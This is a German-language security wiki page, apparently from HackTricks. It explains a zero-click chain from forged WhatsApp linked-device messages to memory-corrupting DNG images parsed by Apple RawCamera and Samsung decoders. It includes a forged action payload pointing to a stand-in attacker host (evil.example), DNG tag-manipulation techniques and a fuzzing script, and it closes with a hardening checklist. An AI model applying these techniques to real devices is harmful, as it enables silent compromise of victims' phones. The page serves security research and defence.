# Zero-click Messaging → Image Parser Chains

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- Behandle **messaging app multi-device/companion protocols** als Fernsteuerkanäle: Selbst wenn Protokollfelder als von vertrauenswürdigen Geräten stammend angenommen werden, können sie trotzdem vom Benutzer kontrolliert sein und oft direkt gegen ein Opfer wieder abgespielt werden, um beliebige Inhalte mit **0 user interaction** zu laden.
- Sobald eine App dazu gebracht werden kann, untrusted media zu laden, ziele auf die **shared OS media pipeline** (RawCamera on iOS/macOS, vendor parsers on Android OEM builds) mit malformed files, um aus der sandbox zu pivoten.
- Die hier diskutierten DNG-basierten RawCamera- und Samsung-Parser-Bugs sind konkrete Beispiele, aber die vollständige Technik ist ein wiederverwendbarer Bauplan zum Verketten von **logic flaws → image parser memory corruption → full device compromise**.

## Remote content loading via WhatsApp linked-device commands

### Attack surface recap

Die WhatsApp "linked devices"-Architektur hält das primäre Telefon und jede Begleitinstanz (Desktop, Tablet, sekundäres Telefon) via verschlüsselter, strukturierter Protokollnachrichten synchron. Jede Nachricht kodiert:

- **Device metadata** (device ID, capabilities, feature flags).
- **Action descriptors** (z. B. sync chats, fetch thumbnails, render remote content).
- **Arbitrary parameters** wie URIs, MIME-Hinweise, Pagination-Keys etc.

Auf Apple-Clients vertraute der Handler, der diese linked-device control packets verarbeitet, implizit darauf, dass bereits ein gültiges pairing stattgefunden hat, sodass hochrelevante Felder (z. B. `resource_url`, `open_media`, `sync_snapshot`) nur minimal validiert wurden. Eine bösartige Companion-Nachricht konnte daher:

1. An jedes Konto geleitet werden, das durch seine Telefonnummer identifiziert ist.
2. Den Transport-Stack (Noise protocol + WhatsApp protobuf framing) überleben, weil der Empfänger nie verifizierte, dass der Sender tatsächlich ein gepairedes Gerät war.
3. Den iOS-Client erreichen, wo der verwundbare Codepfad automatisch eine Hintergrund-HTTP(S)-Anfrage an die Angreifer-URL auslöste und die Antwort in einer versteckten WebView/media renderer parste.

### Practical workflow for auditors

1. **Capture legitimate linked-device traffic.** Hänge einen Debugger oder ein Frida-Skript an den Desktop-/iOS-Client und hooke den Post-Decryption-Handler (z. B. `LinkedDevicesSyncHandler::processAction`). Dump decoded protobuf payloads, um verfügbare Action-Typen und Parameter zu identifizieren.
2. **Identify fields that cross trust boundaries.** Jede Action, die `http_url`, `thumbnail_uri`, `download_url` oder `render_html` Parameter ohne strikte Allow-Lists trägt, ist ein Kandidat für ein remote-content-Primitive.
3. **Forge a malicious action.** Reuse das beobachtete protobuf-Schema und modifiziere nur die vom Angreifer kontrollierten Felder. Eine vereinfachte JSON-Ansicht der relevanten logischen Struktur ist unten gezeigt (der tatsächliche Transport ist protobuf/Noise, aber die semantischen Felder stimmen überein):
```json
{
"op": "sync_action",
"device_id": "<attacker-companion>",
"payload": {
"target": "content_sync",
"resource_url": "https://evil.example/payload.html",
"media_type": "image/dng",
"flags": ["background_fetch", "render_inline"]
}
}
```
4. **An das Opfer zustellen.** Spiele das konstruierte Paket über denselben WhatsApp-Dienst ab, der normalerweise den Traffic verknüpfter Geräte weiterleitet (z. B. mit einem modifizierten Desktop-Client oder einem benutzerdefinierten Noise-Client, der die Angreifer-Kontodaten wiederverwendet). Da CVE-2025-55177 es versäumte, Aktionen an authentifizierte Geräte zu binden, würde der Opfer-Client auf iOS/macOS die Nachricht akzeptieren und sofort die Angreifer-URL ohne jegliche UI abrufen.
5. **Den Fetch instrumentieren.** Beobachte die erzwungene HTTP(S)-Anfrage und den internen Renderer (WKWebView/ImageIO). Zu diesem Zeitpunkt besitzt du eine zero-click web delivery primitive innerhalb von WhatsApp.

## Automatisch dekodierte DNGs gegen RawCamera weaponisieren

Sobald der Angreifer kontrolliert, was WhatsApp lädt, ist das nächste Ziel, iOS/macOS dazu zu bringen, eine bösartige Digitales Negativ (DNG)-Datei mit dem RawCamera-Framework zu parsen. Jede eingebettete <img>/CSS-URL, die auf eine .dng zeigt, wird an die System-Image-Pipeline weitergegeben und ruft RawCamera auf, selbst wenn WhatsApp DNGs nicht explizit behandelt hat.

### RawCamera von WhatsApp aus auslösen

- Stelle HTML bereit, das auf die DNG über mehrere Mechanismen verweist (z. B. <img src="evil.dng">, CSS `background-image: url('evil.dng')`, oder `<picture>`-Quellen), um verschiedene Render-Pfade abzudecken.
- Stelle den korrekten MIME-Typ (`image/x-adobe-dng`) und kleine Previews sicher, damit der Loader nicht wegen Größen-Heuristiken frühzeitig abbricht.
- Die iOS-Media-Sandbox streamt die Datei über `CGImageSourceCreateWithURL` in RawCamera, wodurch letztlich der verwundbare Decoder erreicht wird.

### Erstellung speicherkorruptiver DNGs (im Stil von CVE-2025-43300)

Der reproduzierte Bug beruhte auf inkonsistenten Metadaten, die die Pufferzuweisung von den tatsächlichen Pixel-Lesevorgängen desynchronisierten. Typische Hebel umfassen:

- **Tile/strip descriptors**: Setze `TileByteCounts`/`StripByteCounts` auf realistische Werte, erhöhe jedoch `TileOffsets`, sodass sie über den zugewiesenen Puffer hinauszeigen.
- **Sub-IFD chains**: Betten sekundäre Bilder mit widersprüchlichen `ImageWidth`/`ImageLength` und `BitsPerSample` ein, sodass RawCamera einen kleinen Puffer berechnet, während spätere Stufen Angreifer-kontrollierte Dimensionen vertrauen.
- **Opcode metadata**: Manipuliere `OpcodeList3`-Einträge, sodass die pro-Zeile-Verarbeitung auf vom Angreifer gewählten Indexen arbeitet.

Ein grundlegender Mutation-Harness zur Suche nach solchen Korruptionen kann um macOS herum aufgebaut werden, da derselbe RawCamera-Code auf macOS/iOS/iPadOS ausgeliefert wird:
```bash
#!/bin/bash
set -e
for sample in corpus/*.dng; do
radamsa "$sample" > /tmp/poc.dng
/System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || {
mv /tmp/poc.dng crashes/$(date +%s).dng
}
done
```
Jeder Absturz in `RawCamera` verschafft dir ein neues Primitive. Der veröffentlichte PoC erzielte einen sauberen out-of-bounds read/write, der zuverlässig genug war, um WhatsApp auf iPhone, iPad und Mac zum Absturz zu bringen.

## Aufbau der 0-click-Kette

1. **Linked-device packet** → zwingt WhatsApp dazu, `https://evil.example/payload.html` ohne irgendeinen Tap abzurufen.
2. **Payload HTML** → verweist stillschweigend auf `evil.dng`, wodurch garantiert wird, dass RawCamera vom OS media stack aufgerufen wird.
3. **Malicious DNG** → missbraucht manipulierte Tags, um das RawCamera OOB auszulösen und den Image-Decoder zu crashen/ownen.
4. **Post-corruption exploitation** → füge info-leak gadgets hinzu (z. B. durch Ausnutzung vorhersehbarer heap metadata) und baue eine ROP/JOP-Kette auf, um aus der WhatsApp sandbox auszubrechen und in privilegiertere Kontexte zu gelangen.

Da jeder Schritt automatisch abläuft, benötigt der Angreifer nur die Telefonnummer des Opfers. Auf dem Zielgerät werden keine Notifications, Banner oder Prompts angezeigt.

## Samsung vendor image parser parallels

Samsungs Bulletin zu CVE-2025-21043 bestätigte, dass ihr proprietärer Image-Parsing-Stack (verwendet von Gallery, Messages und auch indirekt von WhatsApp) eine **out-of-bounds write** aufwies, die über untrusted media erreichbar ist. Die Exploit-Methodik spiegelt die Apple-Kette wider:

- Identifiziere einen auto-preview vector (Chat-Thumbnails, Notification Previews, Share Sheets), der die Angreiferdatei mit Samsungs `libimagecodec`/`libOneUI_ImageDecoder`-Bibliotheken parst.
- Diff OEM-Library-Updates oder fuzz die Parser mit fehlerhaften RAW/DNG-Dateien, bis du Speicherkorruptionen siehst, ähnlich dem RawCamera-Crash (heap metadata clobber, register control, etc.).
- Liefere die manipulierte Datei über einen Kanal aus, der Inhalte bereits automatisch lädt (z. B. derselbe linked-device-primitive, WhatsApp-Preview-Fetcher oder Androids push-to-talk Waveform-Previews).

Sobald ein OOB write im Vendor-Parser existiert, führt die Kombination mit dem WhatsApp auto-fetch primitive zu einer weiteren 0-click-Kette auf Samsung-Geräten.

## Test- & Härtungs-Checkliste

- **Protocol validation**: Erzwinge strikte Allow-Lists für jede linked-device-Aktion. Companion-Commands, die einen Fetch/Render anfordern, müssen das Device-Pairing nachweisen (Payload signieren) und die URL sollte einer Allow-List oder einem signierten Blob entsprechen.
- **Transport replay countermeasures**: Binde jede Aktion an einen pro-Gerät-Schlüssel und lehne Pakete ab, deren Sender-Schlüssel unbekannt ist, selbst wenn die protobuf-Syntax korrekt ist.
- **Media pipeline restrictions**: High-level-Apps sollten nur genehmigte MIME-Typen zulassen und RAW/DNG explizit ablehnen, sofern die Funktion nicht benötigt wird.
- **Parser fuzzing regression tests**: Halte ein Korpus malformed RAW/DNG-Dateien vor und führe sie nach jedem Update gegen RawCamera/vendor-Decoder aus.
- **Crash triage automation**: Hänge `DYLD_INSERT_LIBRARIES`-Sanitizer oder MTE an Fuzz-Geräte, um subtile OOB-Zustände zu erkennen, bevor Angreifer das tun.

## References

- [DNGerousLINK: A Deep Dive into WhatsApp 0-Click Exploits on iOS and Samsung Devices](https://media.ccc.de/v/39c3-dngerouslink-a-deep-dive-into-whatsapp-0-click-exploits-on-ios-and-samsung-devices)

{{#include ../../banners/hacktricks-training.md}}
